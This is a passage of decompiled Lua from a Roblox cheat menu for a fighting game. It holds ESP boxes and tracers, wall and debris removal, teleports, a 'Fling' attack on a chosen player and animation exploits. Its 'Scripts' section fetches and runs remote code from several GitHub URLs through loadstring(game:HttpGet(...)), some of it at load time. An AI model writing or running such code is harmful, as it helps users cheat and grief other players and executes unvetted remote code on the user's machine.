                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_MetalBat", {
                Text = bypassText("Invisible Metal Bat"),
                Values = {},
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_Suiryu", {
                Text = bypassText("Invisible Suiryu"),
                Values = {
                    "Bullet Barrage"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            local tmp734 = Instance.new("Folder", HiddenGui)
            tmp734.Name = bypassText("RemovedInstances")
            local up735 = Instance.new("Folder", tmp734)
            up735.Name = bypassText("RemovedTrees")
            local up736 = Instance.new("Folder", tmp734)
            up736.Name = bypassText("RemovedWalls")
            workspace.ChildAdded:Connect(function(arg737)
                if arg737.Name:lower() == "adjustedhb" and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                    task.spawn(pcall, deleteNew, arg737, false)
                end
            end)
            if workspace.Map:FindFirstChild("Trees") then
                workspace.Map.Trees.ChildAdded:Connect(function(arg738)
                    if Toggles.NoTrees.Value then
                        RenderStepped:Wait()
                        arg738.Parent = up735
                    end
                end)
            end
            debrisFolder.ChildAdded:Connect(function(debrisPart)
                if (debrisPart.Name:lower():find("debris") or debrisPart.Name:lower() == "part") and Toggles.NoDebris.Value then
                    task.spawn(pcall, deleteNew, debrisPart, false)
                elseif debrisPart.Name:lower():find("tree") and Toggles.NoTrees.Value then
                    task.spawn(pcall, deleteNew, debrisPart, false)
                elseif debrisPart.Name:lower():find("smoke") and Toggles.NoSmoke.Value then
                    task.spawn(pcall, deleteNew, debrisPart, false)
                elseif debrisPart.Name:lower():find("explo") and Toggles.NoExplosions.Value then
                    task.spawn(pcall, deleteNew, debrisPart, false)
                elseif table.find({
                    "beamed",
                    "adjusted"
                }, debrisPart.Name:lower()) then
                    if rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                        local tmp740, tmp741, tmp742 = pairs(debrisPart:GetDescendants())
                        while true do
                            local tmp743
                            tmp742, tmp743 = tmp740(tmp741, tmp742)
                            if tmp742 == nil then
                                break
                            end
                            if tmp743:IsA("BasePart") then
                                tmp743.Transparency = 0.8
                                tmp743.CollisionGroup = "untouchable"
                                tmp743.Massless = true
                                tmp743.CanCollide = false
                                tmp743.CanTouch = false
                                tmp743.CanQuery = false
                            end
                        end
                    end
                elseif (debrisPart:IsA("Part") and (debrisPart.Size == Vector3.new(20, 20, 20) and debrisPart.Shape == Enum.PartType.Ball) or debrisPart.Name == "Part") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                    task.spawn(pcall, deleteNew, debrisPart, false)
                end
            end)
            VisualsMainBox:AddToggle("NoCameraAnimations", {
                Text = bypassText("No Camera Animations"),
                Default = false,
                Callback = function(arg744)
                    if arg744 then
                        local tmp745 = workspace.CurrentCamera
                        if tmp745 and tmp745.CameraType ~= Enum.CameraType.Custom then
                            task.spawn(fixCam)
                        end
                    end
                end
            })
            VisualsMainBox:AddDropdown("CoreGUIElements", {
                Text = bypassText("Enabled CoreGUI Elements"),
                Values = {
                    "Player List",
                    "Chat",
                    "All"
                },
                Multi = true,
                Default = {}
            })
            StarterGui.CoreGuiChangedSignal:Connect(function(arg746, arg747)
                RenderStepped:Wait()
                if arg746 ~= Enum.CoreGuiType.PlayerList or (arg747 or not rawget(Options.CoreGUIElements.Value, "Player List")) then
                    if arg746 ~= Enum.CoreGuiType.Chat or (arg747 or not rawget(Options.CoreGUIElements.Value, "Chat")) then
                        if arg746 == Enum.CoreGuiType.All and (not arg747 and rawget(Options.CoreGUIElements.Value, "All")) then
                            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
                        end
                    else
                        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
                    end
                else
                    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
                end
            end)
            VisualsMainBox:AddDivider()
            VisualsMainBox:AddToggle("Visualizer", {
                Text = bypassText("Desync Visualizer"),
                Default = false
            })
            VisualsMainBox:AddToggle("AlwaysVisualize", {
                Text = bypassText("Always Enabled"),
                Default = false
            })
            ESPBox:AddToggle("ShowDeathCounter", {
                Text = bypassText("Show Death Counter"),
                Default = false
            })
            ESPBox:AddToggle("MoveNotifications", {
                Text = bypassText("Move Notifications"),
                Default = false
            })
            ESPBox:AddToggle("ExposeMoveInChat", {
                Text = bypassText("Expose Move In Chat"),
                Default = false
            })
            ESPBox:AddToggle("ExposeWhitelistedPlayers", {
                Text = bypassText("Expose Whitelisted Players"),
                Default = false
            })
            ESPBox:AddDropdown("MoveNotificationMoves", {
                Values = {
                    "Death Counter",
                    "Table Flip",
                    "Serious Punch",
                    "Omni-Directional Punch",
                    "Death Blow",
                    "Last Breath",
                    "20-20-20 Dropkick"
                },
                Default = {},
                Multi = true,
                Searchable = false,
                Text = bypassText("Moves")
            })
            ESPBox:AddDivider()
            ESPBox:AddToggle("BoxESP", {
                Text = bypassText("Box ESP"),
                Default = false
            }):AddColorPicker("BoxColor", {
                Default = Color3.fromRGB(255, 255, 255),
                Title = bypassText("Box Color")
            })
            ESPBox:AddToggle("RainbowBoxColor", {
                Text = bypassText("Rainbow Box"),
                Default = false,
                Callback = function(arg748)
                    if arg748 then
                        local tmp749 = Options.BoxColor.Value
                        repeat
                            local tmp750 = tick() * 2
                            local tmp751 = math.abs(math.sin(tmp750)) * 255
                            local tmp752 = math.abs(math.sin(tmp750 + math.pi / 3)) * 255
                            local tmp753 = math.abs(math.sin(tmp750 + 2 * math.pi / 3)) * 255
                            Options.BoxColor:SetValueRGB(Color3.fromRGB(tmp751, tmp752, tmp753))
                            Options.BoxColor:Update()
                            task.wait(0.03)
                        until not Toggles.RainbowBoxColor.Value
                        Options.BoxColor:SetValueRGB(tmp749)
                    end
                end
            })
            ESPBox:AddSlider("BoxThickness", {
                Text = bypassText("Box Thickness"),
                Default = 1,
                Min = 1,
                Max = 3,
                Rounding = 1,
                Compact = true
            })
            ESPBox:AddSlider("BoxTransparency", {
                Text = bypassText("Box Transparency"),
                Default = 1,
                Min = 0,
                Max = 1,
                Rounding = 1,
                Compact = true
            })
            ESPBox:AddToggle("FaceCamera", {
                Text = bypassText("Face Camera"),
                Default = false
            })
            ESPBox:AddDivider()
            ESPBox:AddToggle("Tracers", {
                Text = bypassText("Tracers"),
                Default = false
            }):AddColorPicker("TracerColor", {
                Default = Color3.fromRGB(255, 255, 255),
                Title = bypassText("Tracers Color")
            })
            ESPBox:AddToggle("RainbowTracers", {
                Text = bypassText("Rainbow Tracers"),
                Default = false,
                Callback = function(arg754)
                    if arg754 then
                        local tmp755 = Options.TracerColor.Value
                        repeat
                            local tmp756 = tick() * 2
                            local tmp757 = math.abs(math.sin(tmp756)) * 255
                            local tmp758 = math.abs(math.sin(tmp756 + math.pi / 3)) * 255
                            local tmp759 = math.abs(math.sin(tmp756 + 2 * math.pi / 3)) * 255
                            Options.TracerColor:SetValueRGB(Color3.fromRGB(tmp757, tmp758, tmp759))
                            Options.TracerColor:Update()
                            task.wait(0.03)
                        until not Toggles.RainbowTracers.Value
                        Options.TracerColor:SetValueRGB(tmp755)
                    end
                end
            })
            ESPBox:AddSlider("TracerThickness", {
                Text = bypassText("Tracer Thickness"),
                Default = 1,
                Min = 1,
                Max = 3,
                Rounding = 1,
                Compact = true
            })
            ESPBox:AddSlider("TracerTransparency", {
                Text = bypassText("Tracer Transparency"),
                Default = 1,
                Min = 0,
                Max = 1,
                Rounding = 1,
                Compact = true
            })
            ESPBox:AddToggle("UnlockTracers", {
                Text = bypassText("Unlock Tracers"),
                Default = false,
                Disabled = isMobile
            })
            WorldBox:AddToggle("NoWalls", {
                Text = bypassText("No Walls"),
                Default = false,
                Callback = function(arg760)
                    if arg760 then
                        local tmp761, tmp762, tmp763 = pairs(workspace.Map:GetChildren())
                        while true do
                            local tmp764
                            tmp763, tmp764 = tmp761(tmp762, tmp763)
                            if tmp763 == nil then
                                break
                            end
                            if table.find({
                                "Walls",
                                "GrassTop",
                                "Tunnel",
                                "Part"
                            }, tmp764.Name) then
                                tmp764.Parent = up736
                            end
                        end
                    elseif not arg760 then
                        local tmp765 = up736
                        local tmp766, tmp767, tmp768 = pairs(tmp765:GetChildren())
                        while true do
                            local tmp769
                            tmp768, tmp769 = tmp766(tmp767, tmp768)
                            if tmp768 == nil then
                                break
                            end
                            tmp769.Parent = workspace.Map
                        end
                    end
                end
            })
            WorldBox:AddToggle("NoTrees", {
                Text = bypassText("No Trees"),
                Default = false,
                Callback = function(arg770)
                    if workspace.Map:FindFirstChild("Trees") then
                        if arg770 then
                            local tmp771, tmp772, tmp773 = pairs(workspace.Map.Trees:GetChildren())
                            while true do
                                local tmp774
                                tmp773, tmp774 = tmp771(tmp772, tmp773)
                                if tmp773 == nil then
                                    break
                                end
                                tmp774.Parent = up735
                            end
                        elseif not arg770 then
                            local tmp775 = up735
                            local tmp776, tmp777, tmp778 = pairs(tmp775:GetChildren())
                            while true do
                                local tmp779
                                tmp778, tmp779 = tmp776(tmp777, tmp778)
                                if tmp778 == nil then
                                    break
                                end
                                tmp779.Parent = Workspace.Map.Trees
                            end
                        end
                    end
                end
            })
            WorldBox:AddToggle("NoDebris", {
                Text = bypassText("No Debris"),
                Default = false,
                Callback = function(arg780)
                    if arg780 then
                        local tmp781 = debrisFolder
                        local tmp782, tmp783, tmp784 = pairs(tmp781:GetChildren())
                        while true do
                            local tmp785
                            tmp784, tmp785 = tmp782(tmp783, tmp784)
                            if tmp784 == nil then
                                break
                            end
                            if tmp785.Name:lower():find("debris") or tmp785.Name:lower() == "part" then
                                task.spawn(pcall, deleteNew, tmp785, false)
                            end
                        end
                    end
                end
            })
            WorldBox:AddToggle("NoSmoke", {
                Text = bypassText("No Smoke"),
                Default = false,
                Callback = function(arg786)
                    if arg786 then
                        local tmp787 = debrisFolder
                        local tmp788, tmp789, tmp790 = pairs(tmp787:GetChildren())
                        while true do
                            local tmp791
                            tmp790, tmp791 = tmp788(tmp789, tmp790)
                            if tmp790 == nil then
                                break
                            end
                            if tmp791.Name:lower():find("smoke") then
                                task.spawn(pcall, deleteNew, tmp791, false)
                            end
                        end
                    end
                end
            })
            WorldBox:AddToggle("NoExplosions", {
                Text = bypassText("No Explosions"),
                Default = false,
                Callback = function(arg792)
                    if arg792 then
                        local tmp793 = debrisFolder
                        local tmp794, tmp795, tmp796 = pairs(tmp793:GetChildren())
                        while true do
                            local tmp797
                            tmp796, tmp797 = tmp794(tmp795, tmp796)
                            if tmp796 == nil then
                                break
                            end
                            if tmp797.Name:lower():find("explo") then
                                task.spawn(pcall, deleteNew, tmp797, false)
                            end
                        end
                    end
                end
            })
            WorldBox:AddDivider()
            WorldBox:AddToggle("AmbientEnabled", {
                Text = bypassText("Ambient Enabled"),
                Default = false,
                Callback = function(arg798)
                    if arg798 then
                        local tmp799 = Lighting.Ambient
                        Lighting.Ambient = Options.AmbientColor.Value
                        repeat
                            task.wait()
                        until not Toggles.AmbientEnabled.Value
                        Lighting.Ambient = tmp799
                    end
                end
            }):AddColorPicker("AmbientColor", {
                Default = Color3.fromRGB(255, 255, 255),
                Title = bypassText("Ambient"),
                Callback = function(arg800)
                    if Toggles.AmbientEnabled.Value then
                        Lighting.Ambient = arg800
                    end
                end
            })
            WorldBox:AddToggle("RainbowAmbient", {
                Text = bypassText("Rainbow Ambient"),
                Default = false,
                Callback = function(arg801)
                    if arg801 then
                        local tmp802 = Options.AmbientColor.Value
                        repeat
                            local tmp803 = tick() * 2
                            local tmp804 = math.abs(math.sin(tmp803)) * 255
                            local tmp805 = math.abs(math.sin(tmp803 + math.pi / 3)) * 255
                            local tmp806 = math.abs(math.sin(tmp803 + 2 * math.pi / 3)) * 255
                            Options.AmbientColor:SetValueRGB(Color3.fromRGB(tmp804, tmp805, tmp806))
                            Options.AmbientColor:Update()
                            task.wait(0.03)
                        until not Toggles.RainbowAmbient.Value
                        Options.AmbientColor:SetValueRGB(tmp802)
                    end
                end
            })
            local tmp807, tmp808, tmp809 = pairs(sortedTPNames)
            local up810 = up637
            while true do
                local up811
                tmp809, up811 = tmp807(tmp808, tmp809)
                if tmp809 == nil then
                    break
                end
                TeleportsBox:AddButton({
                    Text = bypassText(up811),
                    Callback = function()
                        heartbeatTp(TeleportLocations[up811])
                    end
                })
            end
            local up812 = {}
            PlayersMapBox:AddDropdown("TargetPlayer", {
                SpecialType = "Player",
                ExcludeLocalPlayer = true,
                Text = bypassText("Target"),
                Callback = function(argUp813)
                    local tmp814, tmp815, tmp816 = pairs(up812)
                    while true do
                        local tmp817
                        tmp816, tmp817 = tmp814(tmp815, tmp816)
                        if tmp816 == nil then
                            break
                        end
                        tmp817.Base:Destroy()
                    end
                    table.clear(up812)
                    if argUp813 then
                        local tmp818 = PlayersMapBox
                        up812[# up812 + 1] = tmp818:AddButton({
                            Text = bypassText("Goto"),
                            Callback = function()
                                local tmp819 = getChar(argUp813)
                                local tmp820
                                if tmp819 then
                                    tmp820 = getRoot(tmp819)
                                else
                                    tmp820 = tmp819
                                end
                                if tmp819 and tmp820 then
                                    heartbeatTp(tmp820.CFrame)
                                end
                            end
                        })
                        local tmp821 = PlayersMapBox
                        up812[# up812 + 1] = tmp821:AddButton({
                            Text = bypassText("Fling"),
                            Callback = function()
                                fling(argUp813)
                            end
                        })
                    end
                end
            })
            AnimsBox:AddDropdown("IdleAnimation", {
                Values = {
                    "Normal",
                    "Watch",
                    "Casual",
                    "Confident",
                    "Fent Master",
                    "Fly Idle",
                    "Random"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Idle Animation")
            })
            AnimsBox:AddSlider("IdleAnimationEndFadeTime", {
                Text = bypassText("Idle Animation End Fade Time"),
                Default = 0.2,
                Min = 0.1,
                Max = 1,
                Rounding = 1
            })
            AnimsBox:AddDivider()
            AnimsBox:AddDropdown("RunAnimation", {
                Values = {
                    "Normal",
                    "Gojo Run",
                    "Sonic EXE",
                    "Girly Walk",
                    "Steve Walk",
                    "Sassy Walk",
                    "Yandere Walk",
                    "Sword Walk",
                    "March",
                    "Hunter",
                    "Goofy",
                    "Officer Earl",
                    "Kazotsky Kick"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Run Animation")
            })
            AnimsBox:AddSlider("RunAnimationSpeed", {
                Text = bypassText("Run Animation Speed"),
                Default = 1,
                Min = 0.25,
                Max = 3,
                Rounding = 1
            })
            AnimsBox:AddSlider("RunAnimationStartFadeTime", {
                Text = bypassText("Run Animation Start Fade Time"),
                Default = 0.1,
                Min = 0.1,
                Max = 1,
                Rounding = 1
            })
            AnimsBox:AddSlider("RunAnimationEndFadeTime", {
                Text = bypassText("Run Animation End Fade Time"),
                Default = 0.1,
                Min = 0.1,
                Max = 1,
                Rounding = 1
            })
            AnimsBox:AddDivider()
            AnimsBox:AddDropdown("BlockAnimation", {
                Values = {
                    "Normal",
                    "One Hand",
                    "Gojo",
                    "Infinity",
                    "Boxer"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Block Animation")
            })
            AnimsBox:AddSlider("BlockAnimationEndFadeTime", {
                Text = bypassText("Block Animation End Fade Time"),
                Default = 0.2,
                Min = 0.1,
                Max = 1,
                Rounding = 1
            })
            AnimsBox:AddDivider()
            AnimsBox:AddDropdown("LoopedAnimation", {
                Values = {
                    "None",
                    "Spin",
                    "Boogie Down"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Looped Animation")
            })
            AnimsBox:AddSlider("LoopedAnimationSpeed", {
                Text = bypassText("Animation Speed"),
                Default = 1,
                Min = 0.1,
                Max = 10,
                Rounding = 1
            })
            AnimsBox:AddDivider()
            AnimsBox:AddToggle("FuckedUpCharacter", {
                Text = bypassText("Fucked Up Character"),
                Default = false
            })
            AnimsBox:AddToggle("NoTrashcanHold", {
                Text = bypassText("No Trashcan Hold"),
                Default = false,
                Callback = function(arg822)
                    if arg822 then
                        stopAllAnims(nil, {
                            "13813450889",
                            "13813448561"
                        })
                    end
                end
            })
            AnimsBox:AddToggle("DisableIntro", {
                Text = bypassText("Disable Intro"),
                Default = false,
                Callback = function(arg823)
                    if arg823 then
                        communicate({
                            Goal = "Disable Intro"
                        })
                    end
                end
            })
            local tmp824 = ScriptsBox.AddButton
            local tmp825 = {
                Text = bypassText("Infinite Yield"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))
            }
            tmp824(ScriptsBox, tmp825)
            local tmp826 = ScriptsBox.AddButton
            local tmp827 = {
                Text = bypassText("Remote Spy"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua", true))
            }
            tmp826(ScriptsBox, tmp827)
            local tmp828 = ScriptsBox.AddButton
            local tmp829 = {
                Text = bypassText("Dark Dex V3"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))
            }
            tmp828(ScriptsBox, tmp829)
            local tmp830 = ScriptsBox.AddButton
            local tmp831 = {
                Text = bypassText("Bypassed Dark Dex V3"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))
            }
            tmp830(ScriptsBox, tmp831)
            ScriptsBox:AddLabel({
                Text = bypassText("Credits:\n\r\n(discord tags)\r\nKade\'s Scripts: @i.am.an.agent\r\nKiosk\'s Scripts: @mnoq"),
                DoesWrap = true,
                Size = 16
            })
            local tmp832 = ScriptsBox.AddButton
            local tmp833 = {
                Text = bypassText("Kade Gojo V1"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua"))
            }
            tmp832(ScriptsBox, tmp833)
            ScriptsBox:AddButton({
                Text = bypassText("Kade Gojo V2 (Morph)"),
                Callback = function()
                    getgenv().morph = true
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/refs/heads/main/LatestV2.lua"))()
                end
            })
            local tmp834 = ScriptsBox.AddButton
            local tmp835 = {
                Text = bypassText("Kade Gojo V2 (No Morph)"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/refs/heads/main/LatestV2.lua"))
            }
            tmp834(ScriptsBox, tmp835)
            local tmp836 = ScriptsBox.AddButton
            local tmp837 = {
                Text = bypassText("Saitama Overhaul"),
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/SaitamaOverhaul/refs/heads/main/Latest.lua"))
            }
            tmp836(ScriptsBox, tmp837)
            ScriptsBox:AddButton({
                Text = bypassText("KadeJ / KaitamaJ"),
                Callback = function()
                    local tmp838 = {
                        ExecuteOnRespawn = false,
                        TSBStyleNotification = true,
                        UseOldCollateralRuin = true,
                        NoWarning = false,
                        NoDeathCounterImages = false,
                        NoBarrageArms = false,
                        NoPreysPerilAttract = false,
                        NoWalls = false,
                        NoTrees = false,
                        RavageTool = true,
                        AdrenalineBoostTool = true,
                        Adrenaline_Multiplier = 2,
                        CustomUppercutAnimation = true,
                        CustomDownslamAnimation = true,
                        CustomIdleAnimation = true,
                        UltNames = {
                            "20 SERIES",
                            "COME AT ME",
                            "I\'M DONE"
                        },
                        MoveNames = {
                            ["Normal Punch"] = "Ravaging Kick",
                            ["Consecutive Punches"] = "Fist Fusillade",
                            Shove = "Swift Sweep",
                            Uppercut = "Collateral Storm",
                            ["Death Counter"] = "Sudden Strike",
                            ["Table Flip"] = "Stoic Bomb",
                            ["Serious Punch"] = "Destructive Power",
                            ["Omni Directional Punch"] = "Omni Directional Fists"
                        }
                    }
                    getgenv().Moveset_Settings = tmp838
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToKJ/refs/heads/main/Latest.lua"))()
                end
            })
            ScriptsBox:AddButton({
                Text = bypassText("Dragon Ball Super Hit (Morph)"),
                Callback = function()
                    getgenv().Morph = true
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/OneEyedLord/Main/refs/heads/main/HitDBS.lua"))()
                end
            })
            ScriptsBox:AddButton({
                Text = bypassText("Dragon Ball Super Hit (No Morph)"),
                Callback = function()
                    getgenv().Morph = false
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/OneEyedLord/Main/refs/heads/main/HitDBS.lua"))()
                end
            })
            local up839 = Instance.new("Part", Workspace)
            up839.CFrame = TeleportLocations.Void * CFrame.new(0, - 8, 0)
            up839.Anchored = true
            up839.Size = Vector3.new(2048, 10, 2048)
            up839.Transparency = 0.5
            up839.Name = HttpService:GenerateGUID()
            up839.Parent = Workspace
            local tmp840 = LocalPlayer.PlayerGui:FindFirstChild("Emotes")
            local tmp841
            if tmp840 then
                tmp841 = tmp840:FindFirstChildWhichIsA("ImageLabel")
            else
                tmp841 = tmp840
            end
            if tmp840 and tmp841 then
                local tmp842, tmp843, tmp844 = pairs(tmp841:GetChildren())
                local function tmp854(arg845)
                    local tmp846 = arg845:FindFirstChild("Button")
                    if arg845:IsA("Frame") and (tonumber(arg845.Name) and tmp846) then
                        worldConnections[# worldConnections + 1] = tmp846.MouseButton1Click:Connect(function()
                            local tmp847 = getChar(LocalPlayer)
                            local tmp848
                            if tmp847 then
                                tmp848 = getHumanoid(tmp847)
                            else
                                tmp848 = tmp847
                            end
                            if tmp847 and (tmp848 and (not tmp847:FindFirstChild("Freeze") and Toggles.EmoteDash.Value)) then
                                local tmp849 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000
                                task.wait(tmp849 / 2)
                                local tmp850, tmp851, tmp852 = pairs(tmp848:GetPlayingAnimationTracks())
                                while true do
                                    local tmp853
                                    tmp852, tmp853 = tmp850(tmp851, tmp852)
                                    if tmp852 == nil then
                                        break
                                    end
                                    if table.find({
                                        "rbxassetid://10480796021",
                                        "rbxassetid://10480793962",
                                        "rbxassetid://10491993682"
                                    }, tmp853.Animation.AnimationId) then
                                        tmp853:AdjustSpeed(99)
                                    end
                                end
                            end
                        end)
                    end
                end
                while true do
                    local tmp855
                    tmp844, tmp855 = tmp842(tmp843, tmp844)
                    if tmp844 == nil then
                        break
                    end
                    tmp854(tmp855)
                end
                tmp841.ChildAdded:Connect(tmp854)
            end
            local clonedChar = nil
            
--[[ 22. INIT MAIN ]]
function init(_)
                local tmp857, tmp858, tmp859 = pairs(charConnections)
                while true do
                    local tmp860
                    tmp859, tmp860 = tmp857(tmp858, tmp859)
                    if tmp859 == nil then
                        break
                    end
                    tmp860:Disconnect()
                end
                table.clear(charConnections)
                if clonedChar then
                    clonedChar:Destroy()
                    clonedChar = nil
                end
                repeat
                    task.wait()
                until getChar(LocalPlayer) and (getRoot(getChar(LocalPlayer)) and getHumanoid(getChar(LocalPlayer)))
                local myChar = getChar(LocalPlayer)
                local myRoot
                if myChar then
                    myRoot = getRoot(myChar)
                else
                    myRoot = myChar
                end
                local myHumanoid
                if myChar then
                    myHumanoid = getHumanoid(myChar)
                else
                    myHumanoid = myChar
                end
                if myChar and (myRoot and myHumanoid) then
                    local tmp864 = myChar.Archivable
                    myChar.Archivable = true
                    clonedChar = myChar:Clone()
                    myChar.Archivable = tmp864
                    clonedChar.Parent = workspace
                    local up865 = nil
                    local clonedRoot
                    if myChar and clonedChar then
                        clonedRoot = getRoot(clonedChar)
                        local clonedHum = getHumanoid(clonedChar)
                        if clonedChar and (clonedRoot and clonedHum) then
                            clonedRoot.Anchored = true
                            local tmp868 = clonedChar:FindFirstChildWhichIsA("Highlight") or Instance.new("Highlight", HiddenGui)
                            tmp868.FillTransparency = 0.5
                            tmp868.OutlineTransparency = 0
                            tmp868.DepthMode = "AlwaysOnTop"
                            tmp868.FillColor = Color3.fromRGB(0, 255, 255)
                            tmp868.OutlineColor = Color3.fromRGB(0, 255, 255)
                            tmp868.Adornee = clonedChar
                            local tmp869 = clonedChar
                            local tmp870, tmp871, tmp872 = pairs(tmp869:GetDescendants())
                            while true do
                                local tmp873, tmp874 = tmp870(tmp871, tmp872)
                                if tmp873 == nil then
                                    break
                                end
                                tmp872 = tmp873
                                if tmp874:IsA("BasePart") and tmp874 ~= clonedRoot then
                                    tmp874.CollisionGroup = "untouchable"
                                    tmp874.Massless = true
                                    tmp874.CanCollide = false
                                    tmp874.CanTouch = false
                                    tmp874.CanQuery = false
                                    tmp874.Transparency = 0.5
                                elseif tmp874:IsA("Trail") or tmp874:IsA("ParticleEmitter") then
                                    task.spawn(pcall, deleteNew, tmp874, false)
                                end
                            end
                            task.delay(0.1, function()
                                up865 = loadAnim(clonedHum, "18236605028")
                                up865.Priority = Enum.AnimationPriority.Action4
                            end)
                        end
                    else
                        clonedRoot = nil
                    end
                    local up875 = loadAnim(myHumanoid, "18236605028", "Server")
                    up875.Priority = Enum.AnimationPriority.Action3
                    local up876 = nil
                    local up877 = nil
                    local up878 = 0
                    local up879 = nil
                    local tmp880 = RenderStepped
                    charConnections[# charConnections + 1] = tmp880:Connect(function()
                        up839.CFrame = CFrame.new(myRoot.Position.X, TeleportLocations.Void.Y - 8, myRoot.Position.Z)
                        up876 = myHumanoid.Health
                        if myRoot.CFrame.Y <= - 9000000000 or myRoot.CFrame.Y >= 9000000000 then
                            if myRoot.CFrame.Y < - 9000000000 or myRoot.CFrame.Y > 9000000000 then
                                heartbeatTp(up877)
                            end
                        else
                            up877 = myRoot.CFrame
                        end
                        up878 = up878 + 1
                        local tmp881 = Options.LoopedAnimation.Value
                        local tmp882 = {
                            Spin = "188632011",
                            ["Boogie Down"] = "140290021376754"
                        }
                        if tmp882[tmp881] and (up879 and not up879.Animation.AnimationId:match(tmp882[tmp881]) or not up879) then
                            up879 = loadAnim(myHumanoid, tmp882[tmp881])
                            up879.Priority = Enum.AnimationPriority.Action2
                        end
                        if up879 then
                            if tmp882[tmp881] and not up879.IsPlaying then
                                up879:Play()
                                up879.Looped = true
                            elseif up879.IsPlaying and not tmp882[tmp881] or up878 % 1000 == 0 then
                                up879:Stop()
                                up879 = nil
                            end
                            up879:AdjustSpeed(Options.LoopedAnimationSpeed.Value * (tmp881 == "Boogie Down" and 1.5 or 1))
                        end
                        local tmp883 = 1
                        if up875 then
                            if Toggles.FuckedUpCharacter.Value and not up875.IsPlaying then
                                up875:Play()
                                up875.Looped = true
                            elseif up875.IsPlaying and not Toggles.FuckedUpCharacter.Value or up878 % 1000 == 0 then
                                up875:Stop()
                            end
                            up875:AdjustSpeed(tmp883)
                        end
                        if up865 then
                            if Toggles.FuckedUpCharacter.Value then
                                clonedRoot.CFrame = myRoot.CFrame
                                if not up865.IsPlaying then
                                    up865:Play()
                                    up865.Looped = true
                                end
                            else
                                clonedRoot.CFrame = CFrame.new(100000000, 100000000, 100000000)
                                if up865.IsPlaying then
                                    up865:Stop()
                                end
                            end
                            up865:AdjustSpeed(tmp883)
                        end
                    end)
                    task.spawn(function()
                        repeat
                            repeat
                                if not task.wait() or getChar(LocalPlayer) and getChar(LocalPlayer) ~= myChar then
                                    return
                                end
                            until myChar:GetAttribute("Blocking") and myChar:GetAttribute("Blocking") == true
                            local tmp884 = Options.BlockAnimation.Value
                            local animAssetId = tmp884 == "Normal" and "" or (tmp884 == "One Hand" and "17097146599" or (tmp884 == "Gojo" and "18459178353" or (tmp884 == "Infinity" and "15020965094" or (tmp884 == "Boxer" and "14616272668" or ""))))
                        until not animAssetId:match("^%s*$")
                        local loadedTrack = loadAnim(myHumanoid, animAssetId)
                        loadedTrack = loadedTrack or loadAnim(myHumanoid, animAssetId)
                        if loadedTrack and not loadedTrack.IsPlaying then
                            loadedTrack:Play()
                            if animAssetId == "17097146599" then
                                loadedTrack:AdjustSpeed(2.5)
                                repeat
                                    task.wait()
                                until loadedTrack.TimePosition >= 1
                                loadedTrack:AdjustSpeed(0)
                            elseif animAssetId == "18459178353" then
                                loadedTrack:AdjustSpeed(2.5)
                                repeat
                                    task.wait()
                                until loadedTrack.TimePosition >= 0.5
                                loadedTrack:AdjustSpeed(0)
                            elseif animAssetId == "15020965094" then
                                loadedTrack.TimePosition = 1
                                loadedTrack:AdjustSpeed(0)
                            elseif animAssetId == "14616272668" then
                                loadedTrack.TimePosition = 0.25
                                loadedTrack:AdjustSpeed(0)
                                TweenService:Create(loadedTrack, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, - 1, true, 0), {
                                    TimePosition = 0.4
                                }):Play()
                            end
                        end
                        task.wait()
                        if myChar:GetAttribute("Blocking") == false or tmp884 ~= Options.BlockAnimation.Value then
                        else
                        end
                        if loadedTrack then
                            loadedTrack:Stop(Options.BlockAnimationEndFadeTime.Value)
                        end
                    end)
                    task.spawn(function()
                        repeat
                            repeat
                                if not task.wait() or getChar(LocalPlayer) and getChar(LocalPlayer) ~= myChar then
                                    return
                                end
                                if myHumanoid.MoveDirection == Vector3.new() then
                                end
                            until myHumanoid.MoveDirection ~= Vector3.new()
                            local tmp887 = Options.RunAnimation.Value
                            local up888 = tmp887 == "Normal" and "" or (tmp887 == "Gojo Run" and "18897115785" or (tmp887 == "Sonic EXE" and "17860467628" or (tmp887 == "Girly Walk" and "17861862787" or (tmp887 == "Steve Walk" and "17861872519" or (tmp887 == "Sassy Walk" and "17861893094" or (tmp887 == "Yandere Walk" and "17086054994" or (tmp887 == "Sword Walk" and "17120635926" or (tmp887 == "March" and "15962443652" or (tmp887 == "Hunter" and "15962326593" or (tmp887 == "Goofy" and "18897664299" or (tmp887 == "Officer Earl" and "18897700236" or (tmp887 == "Kazotsky Kick" and "17861870996" or nil))))))))))))
                        until not up888:match("^%s*$")
                        if not RunAnim then
                            RunAnim = loadAnim(myHumanoid, up888)
                        end
